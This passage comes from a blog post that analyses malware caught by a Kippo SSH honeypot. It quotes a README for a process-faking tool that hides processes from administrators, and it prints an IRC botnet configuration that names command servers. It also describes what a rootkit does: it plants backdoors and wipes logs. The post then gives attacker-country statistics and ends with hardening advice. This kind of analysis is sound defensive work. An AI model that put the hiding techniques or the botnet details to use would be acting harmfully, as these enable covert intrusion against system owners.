+<span class="c-Singleline"># ps auwx</span>
+...
+<span class="n">stas</span>        <span class="mi">84</span>  <span class="mf">0.0</span>  <span class="mf">0.6</span>  <span class="mi">2012</span> <span class="mi">1232</span> <span class="n">pts</span><span class="o">/</span><span class="mi">0</span>    <span class="n">S</span>    <span class="mi">19</span>:<span class="mi">12</span>   <span class="mi">0</span>:<span class="mo">00</span> <span class="n">bash</span> -<span class="n">rcfile</span> .<span class="n">bashrc</span>
+<span class="n">stas</span>       <span class="mi">440</span>  <span class="mf">0.0</span>  <span class="mf">0.1</span>  <span class="mi">1204</span>  <span class="mi">376</span> <span class="n">tty2</span>     <span class="n">S</span>    <span class="mi">20</span>:<span class="mi">09</span>   <span class="mi">0</span>:<span class="mo">00</span> <span class="n">pine</span> -<span class="n">i</span>
+<span class="n">stas</span>       <span class="mi">450</span>  <span class="mf">0.0</span>  <span class="mf">0.4</span>  <span class="mi">2544</span>  <span class="mi">816</span> <span class="n">tty2</span>     <span class="n">R</span>    <span class="mi">20</span>:<span class="mi">12</span>   <span class="mi">0</span>:<span class="mo">00</span> <span class="n">ps</span> <span class="n">auwx</span>
+...
+<span class="n">Hahahaah</span>, <span class="n">that&#39;s</span> <span class="n">what</span> <span class="n">we</span> <span class="n">need</span>! <span class="n">Please</span> <span class="n">note</span> <span class="n">that</span> <span class="n">commandline</span> <span class="n">change</span> <span class="n">isn&#39;t</span>
+<span class="n">immediate</span>, <span class="n">just</span> <span class="nb">wait</span> <span class="n">a</span> <span class="n">little</span> <span class="o">before</span> <span class="n">it</span> <span class="n">completes</span>. <span class="n">But</span>... <span class="n">Did</span> <span class="n">you</span> <span class="n">noticed</span>
+<span class="n">a</span> <span class="n">white</span> <span class="n">line</span> <span class="n">between</span> <span class="n">processes</span> <span class="mi">440</span> &amp; <span class="mi">450</span>? <span class="n">Uhm</span>, <span class="n">that&#39;s</span> <span class="k">our</span> <span class="s">&quot;shift buffer&quot;</span>.
+<span class="n">Pray</span> <span class="k">for</span> <span class="n">your</span> <span class="n">admin</span> <span class="n">don&#39;t</span> <span class="n">notice</span> <span class="n">that</span>! <span class="n">Anyway</span>, <span class="n">they</span> <span class="n">are</span> <span class="n">many</span> <span class="n">more</span> <span class="n">problems</span>
+<span class="n">with</span> <span class="n">parameter</span> <span class="n">shifting</span>. <span class="s">&quot;top&quot;</span> <span class="n">program</span>, <span class="k">for</span> <span class="n">example</span>, <span class="n">shows</span> <span class="s">&quot;command names&quot;</span>
+<span class="n">instead</span> <span class="k">of</span> <span class="s">&quot;command lines&quot;</span> <span class="nb">by</span> <span class="k">default</span>. <span class="n">You</span> <span class="n">see</span> <span class="n">a</span> <span class="n">file</span> <span class="nb">name</span> <span class="n">instead</span> <span class="k">of</span>
+<span class="s">&#39;argv[0]&#39;</span> <span class="nb">value</span>. <span class="s">&quot;psf&quot;</span> <span class="n">tries</span> <span class="nb">to</span> <span class="n">fix</span> <span class="n">that</span> <span class="n">creating</span> <span class="nb">symlink</span> <span class="n">with</span> <span class="nb">name</span> <span class="k">of</span>
+<span class="n">faked</span> <span class="n">commandline</span> <span class="nb">to</span> <span class="n">real</span> <span class="n">program</span> (<span class="n">on</span> <span class="n">previous</span> <span class="n">example</span>, <span class="n">it</span> <span class="n">creates</span> <span class="nb">symlink</span>
+/<span class="n">tmp</span>/.<span class="n">psf-xxxx</span><span class="o">/</span><span class="n">pine</span> =&gt; /<span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="nb">sleep</span>). <span class="n">Note</span> <span class="n">that</span> <span class="n">it</span> <span class="n">doesn&#39;t</span> <span class="n">works</span> <span class="n">on</span> *<span class="n">BSD</span>
+<span class="n">systems</span> (*<span class="n">BSD</span> <span class="n">kernel</span> (?) <span class="n">follows</span> <span class="nb">symlink</span> <span class="o">and</span> <span class="n">shows</span> <span class="n">real</span> <span class="n">filename</span> <span class="n">anyway</span>).
+<span class="n">The</span> <span class="n">ways</span> <span class="nb">to</span> <span class="n">discover</span> <span class="n">faked</span> <span class="n">processes</span> <span class="n">I</span> <span class="n">know</span> <span class="n">are:</span>
+
+ * <span class="n">kidding</span> <span class="n">with</span> <span class="n">top</span>(<span class="mi">1</span>)
+ * <span class="n">ps</span> <span class="n">auwx</span> --<span class="n">cols</span> <span class="mi">1024</span>
+ * <span class="nb">cat</span> /<span class="n">proc</span>/[<span class="n">pidn</span>]/<span class="n">cmdline</span> (<span class="n">Linux</span> <span class="k">only</span>)
+ * <span class="n">whatever</span> <span class="n">non-standart</span> <span class="n">process</span> <span class="n">stack</span> <span class="n">monitors</span>
+ * <span class="n">looking</span> <span class="nb">open</span> <span class="n">files</span> <span class="n">with</span> <span class="s">&quot;lsof&quot;</span> <span class="n">program</span>
+ * <span class="k">if</span> <span class="n">you</span> <span class="k">use</span> -<span class="n">d</span> (<span class="n">daemonize</span>) <span class="n">option</span>, <span class="n">be</span> <span class="n">careful</span>!!! <span class="n">As</span> <span class="nb">any</span> <span class="n">cool</span> <span class="n">daemon</span> <span class="n">should</span>
+   <span class="k">do</span>, <span class="s">&quot;psf&quot;</span> <span class="n">closes</span> <span class="n">std</span>(<span class="n">in</span>,<span class="n">out</span>,<span class="n">err</span>). <span class="n">What</span> <span class="n">your</span> <span class="n">admin</span> <span class="k">will</span> <span class="n">think</span> <span class="k">if</span> <span class="n">he</span> (<span class="n">she</span>)
+   <span class="n">sees</span> <span class="s">&quot;pine -i&quot;</span> <span class="n">with</span> <span class="n">no</span> <span class="n">parent</span> <span class="o">and</span> <span class="n">neither</span> <span class="n">allocated</span> <span class="n">TTY</span>?!
+
+<span class="n">Too</span> <span class="n">many</span>, <span class="n">don&#39;t</span> <span class="n">you</span> <span class="n">think</span>? <span class="n">So</span>, <span class="n">what&#39;s</span> *<span class="n">THE</span> <span class="n">BEST</span>* <span class="n">way</span> <span class="nb">to</span> <span class="n">hide</span> <span class="n">processes</span>?
+<span class="n">Rootkit</span> <span class="n">sounds</span> <span class="n">well</span>, <span class="k">but</span> <span class="n">it&#39;s</span> <span class="n">a</span> <span class="nb">bit</span> <span class="nb">complex</span> <span class="nb">to</span> <span class="k">use</span>, <span class="n">you</span> <span class="n">know</span>... <span class="n">So</span>, <span class="n">IMHO</span>,
+<span class="n">you</span> <span class="n">must</span> <span class="n">get</span> <span class="n">source</span> <span class="k">of</span> <span class="n">program</span> <span class="n">you</span> <span class="n">wish</span> <span class="nb">to</span> <span class="n">hide</span> <span class="o">and</span> <span class="n">hardcode</span> <span class="nb">all</span> <span class="n">parameters</span>
+<span class="n">inside</span> <span class="n">executable</span>... <span class="n">After</span> <span class="n">that</span>, <span class="n">rename</span> <span class="n">it</span> <span class="n">in</span> <span class="n">whatever</span> <span class="o">and</span> <span class="k">let</span> <span class="n">it</span> <span class="n">go</span>!
+<span class="n">Of</span> <span class="n">course</span> <span class="n">you</span> <span class="n">must</span> <span class="n">program</span> <span class="n">at</span> <span class="n">least</span> <span class="n">C</span><span class="o">/</span><span class="n">C</span>++ <span class="nb">to</span> <span class="k">do</span> <span class="n">such</span> <span class="n">a</span> <span class="n">trick</span>. <span class="n">Now</span>, <span class="k">if</span>
+<span class="n">you&#39;re</span> <span class="n">glad</span> <span class="n">with</span> <span class="k">my</span> <span class="n">quick</span> &amp; <span class="n">dirty</span> <span class="n">solution</span> <span class="n">called</span> <span class="s">&quot;psf&quot;</span>, <span class="n">happy</span> <span class="n">faking</span>!!!
+*/
+</pre></div>
+
+
+<p>Deviously simple. Adding spaces. There&#8217;s also a configuration file present leading to a lonely <span class="caps">IRC</span> server:
+    <span class="caps">NICK</span>          Sex
+    <span class="caps">USERFILE</span>      1
+    <span class="caps">CMDCHAR</span>       !
+    <span class="caps">LOGIN</span>          tun
+    <span class="caps">IRCNAME</span>       Nelu 
+    <span class="caps">MODES</span>         +ix-ws
+    <span class="caps">TOG</span> <span class="caps">CC</span>        0
+    <span class="caps">TOG</span> <span class="caps">CLOAK</span>     1
+    <span class="caps">TOG</span> <span class="caps">SPY</span>       1
+    <span class="caps">SET</span> <span class="caps">OPMODES</span>   4
+    <span class="caps">SET</span> <span class="caps">BANMODES</span>  6
+    <span class="caps">SET</span> <span class="caps">AAWAY</span>     1
+    <span class="caps">TOG</span> <span class="caps">NOIDLE</span>&nbsp;1</p>
+<div class="highlight"><pre>CHANNEL       #brasov
+TOG PUB       1
+TOG MASS      1
+TOG SHIT      1
+TOG PROT      1
+TOG ENFM      1
+SET ENFM      +nt
+SET MDL       4
+SET MKL       4
+SET MBL       4
+SET MPL       1
+
+
+SERVER 200.41.53.1 6667
+SERVER chmod.myftp.biz 6667
+</pre></div>
+
+
+<p>Joining the channel also reveals a small hacker community using EnergyMechs on hacked servers to DoS Russion web&nbsp;hosts.</p>
+<h2>File&nbsp;http___ema_ucoz_com_ICE_UNIX.tgz</h2>
+<p>Again a <span class="caps">IRC</span> bot leading to an obscure channel on Undernet. I have not repeated the config&nbsp;here.</p>
+<h2>Archive containing&nbsp;.sshd</h2>
+<p>A more unique malware script this time. Containing the <code>shv5-rootkit</code> rootkit, which is, according to the file, &#8220;very private&#8221;, but dates back to 2007, so it&#8217;s probably an old version. The tools first checks for Tripwire, Snort, and other tools. It then continues to install itself into various directories. And starts to install backdoors into various programs (<code>ls</code>, <code>top</code>, &#8230;). It then checks for some basic vulnerable daemons, and warns that you should patch them (oh the irony). It finally also checks for other rootkits (tk7, tk8, beX2, tuxkit, optickit) and tries to remove those. It then tries to cover its tracks by clearing log files. 
+The other files also mostly contained bots pointing to Undernet <span class="caps">IRC</span> channels. Some or quite active and contain around 100 bots, others are empty. Joining some of them gets you an immediate&nbsp;ban.</p>
+<h1>Country&nbsp;statistics</h1>
+<p>I grepped through hundreds of lines of logging from Kippo, removed duplicate <span class="caps">IP</span> addresses, and used GeoIP to do a country lookup. Here are the sorted results:
+    <span class="caps">CN</span>, China                51
+    <span class="caps">US</span>, United States        42
+    <span class="caps">RO</span>, Romania              26
+    <span class="caps">CA</span>, Canada               12
+    <span class="caps">IN</span>, India                11
+    <span class="caps">KR</span>, Korea, Republic of   10
+    <span class="caps">RU</span>, Russian Federation   10
+    <span class="caps">BR</span>, Brazil                8
+    <span class="caps">DE</span>, Germany               8
+    <span class="caps">GB</span>, United Kingdom        8
+    <span class="caps">TH</span>, Thailand              8
+    <span class="caps">IT</span>, Italy                 7
+    <span class="caps">HK</span>, Hong Kong             6
+    <span class="caps">JP</span>, Japan                 5
+    <span class="caps">TR</span>, Turkey                5
+    <span class="caps">AT</span>, Austria               4
+    <span class="caps">TW</span>, Taiwan                4
+    <span class="caps">BE</span>, Belgium               3
+    <span class="caps">CO</span>, Colombia              3
+    <span class="caps">ES</span>, Spain                 3
+    <span class="caps">FR</span>, France                3
+    <span class="caps">NL</span>, Netherlands           3
+    <span class="caps">SE</span>, Sweden                3
+    <span class="caps">CZ</span>, Czech Republic        2
+    <span class="caps">EG</span>, Egypt                 2
+    <span class="caps">ID</span>, Indonesia             2
+    <span class="caps">MD</span>, Moldova, Republic of  2
+    <span class="caps">NO</span>, Norway                2
+    <span class="caps">PL</span>, Poland                2
+    <span class="caps">VN</span>, Vietnam               2
+    <span class="caps">AE</span>, United Arab Emirates  1
+    <span class="caps">AR</span>, Argentina             1
+    <span class="caps">BG</span>, Bulgaria              1
+    <span class="caps">BH</span>, Bahrain               1
+    <span class="caps">CH</span>, Switzerland           1
+    <span class="caps">CL</span>, Chile                 1
+    <span class="caps">CR</span>, Costa Rica            1
+    <span class="caps">GE</span>, Georgia               1
+    <span class="caps">GT</span>, Guatemala             1
+    <span class="caps">HU</span>, Hungary               1
+    <span class="caps">IS</span>, Iceland               1
+    <span class="caps">KE</span>, Kenya                 1
+    <span class="caps">KZ</span>, Kazakhstan            1
+    <span class="caps">LB</span>, Lebanon               1
+    <span class="caps">LT</span>, Lithuania             1
+    <span class="caps">MN</span>, Mongolia              1
+    <span class="caps">MX</span>, Mexico                1
+    <span class="caps">MZ</span>, Mozambique            1
+    <span class="caps">PA</span>, Panama                1
+    <span class="caps">PE</span>, Peru                  1
+    <span class="caps">PH</span>, Philippines           1
+    <span class="caps">SG</span>, Singapore             1
+    <span class="caps">VE</span>, Venezuela&nbsp;1</p>
+<p><img alt="" src="http://1.bp.blogspot.com/-1yjxTiktK-w/TXgYDentuKI/AAAAAAAARR8/Yo1bNNkVWZY/s400/hacker-country-pie.png" />
+Be wary when interpreting these results, as they might represent &#8220;countries containing hacked servers&#8221; more than &#8220;originating countries of hackers&#8221;, as hacked servers are, as we&#8217;ve seen, often used to get to other&nbsp;targets.</p>
+<h1>Concluding&nbsp;remarks</h1>
+<p>Kippo has now been removed from my server, due to the fact that I don&#8217;t have enough time to keep checking up on it and I feel a bit uneasy running a honeypot on server containing important data. As I&#8217;ve said before, modifying and extending Kippo and analysing the results using a few <span class="caps">VPS</span> hosts might be a fun summer project.
+The main lesson to take away from this post is this: keep your servers secure. This means running upgrades, but especially choosing strong passwords (or using <span class="caps">RSA</span> keys). As we&#8217;ve seen, most malware contained brute forcing tools, trying one server after another.
+While analyzing cute honeypot logs is by no means doing what one would call &#8220;advanced security research&#8221;, I did have a lot of fun with it, especially when trying to investigate <span class="caps">IRC</span> channels and trailing the hackers.
+Some time ago (actually: years and years ago), I myself was (indirectly) involved with a botnet, containing not hundred but thousands of bots, which is a story for another time. I understand the thrill of gaining your first rooted shell, but being on the opposite side of things (that is: running a server instead of hacking one) also shows how script kiddies operate without any regard for privacy, property or data. It is a valuable, but sad&nbsp;lesson.</p>
+	</article>
+
+		<hr  class="gradient"/>
+<div class="article-comments">Care to Comment?</div>
+
+<!--
+<div>
+<ul id="commenttabs" style="clear: both;">
+    <li class="active"><a href="#googleplus">Google+</a></li>
+    <li><a href="#facebook">Facebook</a></li>
+    <li><a href="#disqus">Disqus</a></li>
+</ul>
+</div>
+
+<div style="clear: both;"> </div>
+
+<div class="commenttab" id="googleplus">
+	<div class="g-comments" data-href="http://blog.macuyiko.com/post/2011/running-a-ssh-honeypot-with-kippo-lets-catch-some-script-kiddies.html" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD">Loading Google+ comments...</div>
+</div>
+
+<div class="commenttab" id="facebook">
+	<div id="fb-root"><div class="fb-comments" data-href="http://blog.macuyiko.com/post/2011/running-a-ssh-honeypot-with-kippo-lets-catch-some-script-kiddies.html" data-num-posts="20" data-colorscheme="light" data-mobile="auto"></div></div>
+</div>
+-->
+
+<div class="commenttab" id="disqus">
+	<div id="disqus_thread"></div>
+		<script type="text/javascript">
+	    var disqus_shortname = 'macuyiko';
+	    var disqus_identifier = 'post/2011/running-a-ssh-honeypot-with-kippo-lets-catch-some-script-kiddies.html';
+	    var disqus_title = 'Running A SSH Honeypot With Kippo: Let’s Catch Some Script Kiddies';
+	    var disqus_url = 'http://blog.macuyiko.com/post/2011/running-a-ssh-honeypot-with-kippo-lets-catch-some-script-kiddies.html';
+
+	    (function() {
+	        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	    })();
+	</script>
+</div></div>
+		
+	</div>
+
+	<footer class="row">
+		<div class="large-12 columns">
+			<hr />
+			<div class="row">
+				<p>Bed Against The Wall by Seppe "Macuyiko" vanden Broucke</p>
+				<p><a href="http://creativecommons.org/licenses/by-sa/2.0/be/" rel="license"><img title="Creative Commons License" src="http://i.creativecommons.org/l/by-sa/2.0/be/88x31.png" /></a><br />
+				Unless mentioned otherwise, this work is licensed under a <a href="http://creativecommons.org/licenses/by-sa/2.0/be/" rel="license">Creative Commons Attribution-Share Alike 2.0 Belgium License</a>.</p>
+				<p>Static blog engine powered by <a href="http://getpelican.com">Pelican</a>.</p>
+			</div>
+		</div>
+	</footer>
+</div>
+ 
